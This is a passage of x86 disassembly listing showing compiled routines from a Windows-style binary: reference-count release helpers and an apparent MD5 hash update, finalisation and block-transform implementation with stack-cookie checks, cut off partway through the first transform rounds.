  404597:	cc                   	int3
  404598:	cc                   	int3
  404599:	cc                   	int3
  40459a:	cc                   	int3
  40459b:	cc                   	int3
  40459c:	cc                   	int3
  40459d:	cc                   	int3
  40459e:	cc                   	int3
  40459f:	cc                   	int3
  4045a0:	55                   	push   %ebp
  4045a1:	8b ec                	mov    %esp,%ebp
  4045a3:	51                   	push   %ecx
  4045a4:	56                   	push   %esi
  4045a5:	57                   	push   %edi
  4045a6:	8b f9                	mov    %ecx,%edi
  4045a8:	6a 00                	push   $0x0
  4045aa:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4045ad:	e8 56 ea 01 00       	call   0x423008
  4045b2:	8b 47 04             	mov    0x4(%edi),%eax
  4045b5:	85 c0                	test   %eax,%eax
  4045b7:	74 09                	je     0x4045c2
  4045b9:	83 f8 ff             	cmp    $0xffffffff,%eax
  4045bc:	73 04                	jae    0x4045c2
  4045be:	48                   	dec    %eax
  4045bf:	89 47 04             	mov    %eax,0x4(%edi)
  4045c2:	8b 77 04             	mov    0x4(%edi),%esi
  4045c5:	f7 de                	neg    %esi
  4045c7:	1b f6                	sbb    %esi,%esi
  4045c9:	f7 d6                	not    %esi
  4045cb:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4045ce:	23 f7                	and    %edi,%esi
  4045d0:	e8 5b ea 01 00       	call   0x423030
  4045d5:	5f                   	pop    %edi
  4045d6:	8b c6                	mov    %esi,%eax
  4045d8:	5e                   	pop    %esi
  4045d9:	8b e5                	mov    %ebp,%esp
  4045db:	5d                   	pop    %ebp
  4045dc:	c3                   	ret
  4045dd:	cc                   	int3
  4045de:	cc                   	int3
  4045df:	cc                   	int3
  4045e0:	55                   	push   %ebp
  4045e1:	8b ec                	mov    %esp,%ebp
  4045e3:	51                   	push   %ecx
  4045e4:	57                   	push   %edi
  4045e5:	8b 39                	mov    (%ecx),%edi
  4045e7:	85 ff                	test   %edi,%edi
  4045e9:	74 3b                	je     0x404626
  4045eb:	6a 00                	push   $0x0
  4045ed:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4045f0:	e8 13 ea 01 00       	call   0x423008
  4045f5:	8b 47 04             	mov    0x4(%edi),%eax
  4045f8:	85 c0                	test   %eax,%eax
  4045fa:	74 09                	je     0x404605
  4045fc:	83 f8 ff             	cmp    $0xffffffff,%eax
  4045ff:	73 04                	jae    0x404605
  404601:	48                   	dec    %eax
  404602:	89 47 04             	mov    %eax,0x4(%edi)
  404605:	56                   	push   %esi
  404606:	8b 77 04             	mov    0x4(%edi),%esi
  404609:	f7 de                	neg    %esi
  40460b:	1b f6                	sbb    %esi,%esi
  40460d:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  404610:	f7 d6                	not    %esi
  404612:	e8 19 ea 01 00       	call   0x423030
  404617:	23 f7                	and    %edi,%esi
  404619:	74 0a                	je     0x404625
  40461b:	8b 06                	mov    (%esi),%eax
  40461d:	8b 10                	mov    (%eax),%edx
  40461f:	6a 01                	push   $0x1
  404621:	8b ce                	mov    %esi,%ecx
  404623:	ff d2                	call   *%edx
  404625:	5e                   	pop    %esi
  404626:	5f                   	pop    %edi
  404627:	8b e5                	mov    %ebp,%esp
  404629:	5d                   	pop    %ebp
  40462a:	c3                   	ret
  40462b:	cc                   	int3
  40462c:	cc                   	int3
  40462d:	cc                   	int3
  40462e:	cc                   	int3
  40462f:	cc                   	int3
  404630:	55                   	push   %ebp
  404631:	8b ec                	mov    %esp,%ebp
  404633:	51                   	push   %ecx
  404634:	8b 4e 10             	mov    0x10(%esi),%ecx
  404637:	53                   	push   %ebx
  404638:	57                   	push   %edi
  404639:	8b f8                	mov    %eax,%edi
  40463b:	8b c1                	mov    %ecx,%eax
  40463d:	c1 e8 03             	shr    $0x3,%eax
  404640:	8d 0c f9             	lea    (%ecx,%edi,8),%ecx
  404643:	8d 14 fd 00 00 00 00 	lea    0x0(,%edi,8),%edx
  40464a:	83 e0 3f             	and    $0x3f,%eax
  40464d:	c6 46 68 00          	movb   $0x0,0x68(%esi)
  404651:	89 4e 10             	mov    %ecx,0x10(%esi)
  404654:	3b ca                	cmp    %edx,%ecx
  404656:	73 03                	jae    0x40465b
  404658:	ff 46 14             	incl   0x14(%esi)
  40465b:	8b cf                	mov    %edi,%ecx
  40465d:	c1 e9 1d             	shr    $0x1d,%ecx
  404660:	01 4e 14             	add    %ecx,0x14(%esi)
  404663:	bb 40 00 00 00       	mov    $0x40,%ebx
  404668:	2b d8                	sub    %eax,%ebx
  40466a:	3b fb                	cmp    %ebx,%edi
  40466c:	72 45                	jb     0x4046b3
  40466e:	8b 55 08             	mov    0x8(%ebp),%edx
  404671:	53                   	push   %ebx
  404672:	52                   	push   %edx
  404673:	8d 44 30 18          	lea    0x18(%eax,%esi,1),%eax
  404677:	50                   	push   %eax
  404678:	e8 b3 fe 00 00       	call   0x414530
  40467d:	83 c4 0c             	add    $0xc,%esp
  404680:	8d 4e 18             	lea    0x18(%esi),%ecx
  404683:	51                   	push   %ecx
  404684:	8b ce                	mov    %esi,%ecx
  404686:	e8 65 01 00 00       	call   0x4047f0
  40468b:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40468e:	83 c3 3f             	add    $0x3f,%ebx
  404691:	3b df                	cmp    %edi,%ebx
  404693:	73 1a                	jae    0x4046af
  404695:	8b 55 08             	mov    0x8(%ebp),%edx
  404698:	8d 44 1a c1          	lea    -0x3f(%edx,%ebx,1),%eax
  40469c:	50                   	push   %eax
  40469d:	8b ce                	mov    %esi,%ecx
  40469f:	e8 4c 01 00 00       	call   0x4047f0
  4046a4:	83 45 fc 40          	addl   $0x40,-0x4(%ebp)
  4046a8:	83 c3 40             	add    $0x40,%ebx
  4046ab:	3b df                	cmp    %edi,%ebx
  4046ad:	72 e6                	jb     0x404695
  4046af:	33 c0                	xor    %eax,%eax
  4046b1:	eb 07                	jmp    0x4046ba
  4046b3:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4046ba:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4046bd:	2b f9                	sub    %ecx,%edi
  4046bf:	03 4d 08             	add    0x8(%ebp),%ecx
  4046c2:	57                   	push   %edi
  4046c3:	51                   	push   %ecx
  4046c4:	8d 44 30 18          	lea    0x18(%eax,%esi,1),%eax
  4046c8:	50                   	push   %eax
  4046c9:	e8 62 fe 00 00       	call   0x414530
  4046ce:	83 c4 0c             	add    $0xc,%esp
  4046d1:	5f                   	pop    %edi
  4046d2:	5b                   	pop    %ebx
  4046d3:	8b e5                	mov    %ebp,%esp
  4046d5:	5d                   	pop    %ebp
  4046d6:	c2 04 00             	ret    $0x4
  4046d9:	cc                   	int3
  4046da:	cc                   	int3
  4046db:	cc                   	int3
  4046dc:	cc                   	int3
  4046dd:	cc                   	int3
  4046de:	cc                   	int3
  4046df:	cc                   	int3
  4046e0:	55                   	push   %ebp
  4046e1:	8b ec                	mov    %esp,%ebp
  4046e3:	83 ec 24             	sub    $0x24,%esp
  4046e6:	a1 bc d1 42 00       	mov    0x42d1bc,%eax
  4046eb:	33 c5                	xor    %ebp,%eax
  4046ed:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4046f0:	53                   	push   %ebx
  4046f1:	56                   	push   %esi
  4046f2:	8b f1                	mov    %ecx,%esi
  4046f4:	8b 06                	mov    (%esi),%eax
  4046f6:	8b 4e 04             	mov    0x4(%esi),%ecx
  4046f9:	8b 56 08             	mov    0x8(%esi),%edx
  4046fc:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4046ff:	8b 46 0c             	mov    0xc(%esi),%eax
  404702:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  404705:	8b 4e 10             	mov    0x10(%esi),%ecx
  404708:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  40470b:	8b 56 14             	mov    0x14(%esi),%edx
  40470e:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404711:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  404714:	57                   	push   %edi
  404715:	89 55 f0             	mov    %edx,-0x10(%ebp)
  404718:	33 c9                	xor    %ecx,%ecx
  40471a:	8d 46 10             	lea    0x10(%esi),%eax
  40471d:	8d 49 00             	lea    0x0(%ecx),%ecx
  404720:	0f b6 10             	movzbl (%eax),%edx
  404723:	88 54 0d f4          	mov    %dl,-0xc(%ebp,%ecx,1)
  404727:	0f b6 50 01          	movzbl 0x1(%eax),%edx
  40472b:	88 54 0d f5          	mov    %dl,-0xb(%ebp,%ecx,1)
  40472f:	0f b6 50 02          	movzbl 0x2(%eax),%edx
  404733:	88 54 0d f6          	mov    %dl,-0xa(%ebp,%ecx,1)
  404737:	0f b6 50 03          	movzbl 0x3(%eax),%edx
  40473b:	88 54 0d f7          	mov    %dl,-0x9(%ebp,%ecx,1)
  40473f:	83 c1 04             	add    $0x4,%ecx
  404742:	83 c0 04             	add    $0x4,%eax
  404745:	83 f9 08             	cmp    $0x8,%ecx
  404748:	72 d6                	jb     0x404720
  40474a:	8b 4e 10             	mov    0x10(%esi),%ecx
  40474d:	c1 e9 03             	shr    $0x3,%ecx
  404750:	83 e1 3f             	and    $0x3f,%ecx
  404753:	b8 38 00 00 00       	mov    $0x38,%eax
  404758:	83 f9 38             	cmp    $0x38,%ecx
  40475b:	72 05                	jb     0x404762
  40475d:	b8 78 00 00 00       	mov    $0x78,%eax
  404762:	2b c1                	sub    %ecx,%eax
  404764:	68 f8 93 42 00       	push   $0x4293f8
  404769:	e8 c2 fe ff ff       	call   0x404630
  40476e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404771:	50                   	push   %eax
  404772:	b8 08 00 00 00       	mov    $0x8,%eax
  404777:	e8 b4 fe ff ff       	call   0x404630
  40477c:	8d 4e 59             	lea    0x59(%esi),%ecx
  40477f:	8d 46 02             	lea    0x2(%esi),%eax
  404782:	ba 04 00 00 00       	mov    $0x4,%edx
  404787:	eb 07                	jmp    0x404790
  404789:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  404790:	0f b6 58 fe          	movzbl -0x2(%eax),%ebx
  404794:	88 59 ff             	mov    %bl,-0x1(%ecx)
  404797:	0f b6 58 ff          	movzbl -0x1(%eax),%ebx
  40479b:	88 19                	mov    %bl,(%ecx)
  40479d:	0f b6 18             	movzbl (%eax),%ebx
  4047a0:	88 59 01             	mov    %bl,0x1(%ecx)
  4047a3:	0f b6 58 01          	movzbl 0x1(%eax),%ebx
  4047a7:	88 59 02             	mov    %bl,0x2(%ecx)
  4047aa:	83 c0 04             	add    $0x4,%eax
  4047ad:	83 c1 04             	add    $0x4,%ecx
  4047b0:	4a                   	dec    %edx
  4047b1:	75 dd                	jne    0x404790
  4047b3:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4047b6:	8b 55 e0             	mov    -0x20(%ebp),%edx
  4047b9:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4047bc:	89 0e                	mov    %ecx,(%esi)
  4047be:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4047c1:	89 56 04             	mov    %edx,0x4(%esi)
  4047c4:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4047c7:	89 46 08             	mov    %eax,0x8(%esi)
  4047ca:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4047cd:	89 4e 0c             	mov    %ecx,0xc(%esi)
  4047d0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4047d3:	5f                   	pop    %edi
  4047d4:	89 56 10             	mov    %edx,0x10(%esi)
  4047d7:	89 46 14             	mov    %eax,0x14(%esi)
  4047da:	5e                   	pop    %esi
  4047db:	33 cd                	xor    %ebp,%ecx
  4047dd:	5b                   	pop    %ebx
  4047de:	e8 bc db 00 00       	call   0x41239f
  4047e3:	8b e5                	mov    %ebp,%esp
  4047e5:	5d                   	pop    %ebp
  4047e6:	c3                   	ret
  4047e7:	cc                   	int3
  4047e8:	cc                   	int3
  4047e9:	cc                   	int3
  4047ea:	cc                   	int3
  4047eb:	cc                   	int3
  4047ec:	cc                   	int3
  4047ed:	cc                   	int3
  4047ee:	cc                   	int3
  4047ef:	cc                   	int3
  4047f0:	55                   	push   %ebp
  4047f1:	8b ec                	mov    %esp,%ebp
  4047f3:	83 ec 50             	sub    $0x50,%esp
  4047f6:	a1 bc d1 42 00       	mov    0x42d1bc,%eax
  4047fb:	33 c5                	xor    %ebp,%eax
  4047fd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404800:	8b 45 08             	mov    0x8(%ebp),%eax
  404803:	53                   	push   %ebx
  404804:	56                   	push   %esi
  404805:	57                   	push   %edi
  404806:	8b f9                	mov    %ecx,%edi
  404808:	8b 4f 0c             	mov    0xc(%edi),%ecx
  40480b:	8b 77 04             	mov    0x4(%edi),%esi
  40480e:	8b 5f 08             	mov    0x8(%edi),%ebx
  404811:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  404814:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  404817:	89 7d b0             	mov    %edi,-0x50(%ebp)
  40481a:	e8 91 06 00 00       	call   0x404eb0
  40481f:	8b 3f                	mov    (%edi),%edi
  404821:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  404824:	8b d6                	mov    %esi,%edx
  404826:	f7 d2                	not    %edx
  404828:	23 d1                	and    %ecx,%edx
  40482a:	8b c3                	mov    %ebx,%eax
  40482c:	23 c6                	and    %esi,%eax
  40482e:	0b d0                	or     %eax,%edx
  404830:	03 d7                	add    %edi,%edx
  404832:	8b 45 bc             	mov    -0x44(%ebp),%eax
  404835:	8d 84 02 78 a4 6a d7 	lea    -0x28955b88(%edx,%eax,1),%eax
  40483c:	c1 c0 07             	rol    $0x7,%eax
  40483f:	03 c6                	add    %esi,%eax
  404841:	8b fe                	mov    %esi,%edi
  404843:	23 f8                	and    %eax,%edi
  404845:	8b d0                	mov    %eax,%edx
  404847:	f7 d2                	not    %edx
  404849:	23 d3                	and    %ebx,%edx
  40484b:	0b d7                	or     %edi,%edx
  40484d:	03 55 c0             	add    -0x40(%ebp),%edx
  404850:	8d 8c 0a 56 b7 c7 e8 	lea    -0x173848aa(%edx,%ecx,1),%ecx
  404857:	c1 c1 0c             	rol    $0xc,%ecx
  40485a:	03 c8                	add    %eax,%ecx
  40485c:	8b d1                	mov    %ecx,%edx
  40485e:	f7 d2                	not    %edx
  404860:	23 d6                	and    %esi,%edx
  404862:	8b f9                	mov    %ecx,%edi
  404864:	23 f8                	and    %eax,%edi
  404866:	0b d7                	or     %edi,%edx
  404868:	03 55 c4             	add    -0x3c(%ebp),%edx
  40486b:	8d 94 1a db 70 20 24 	lea    0x242070db(%edx,%ebx,1),%edx
  404872:	c1 ca 0f             	ror    $0xf,%edx
  404875:	03 d1                	add    %ecx,%edx
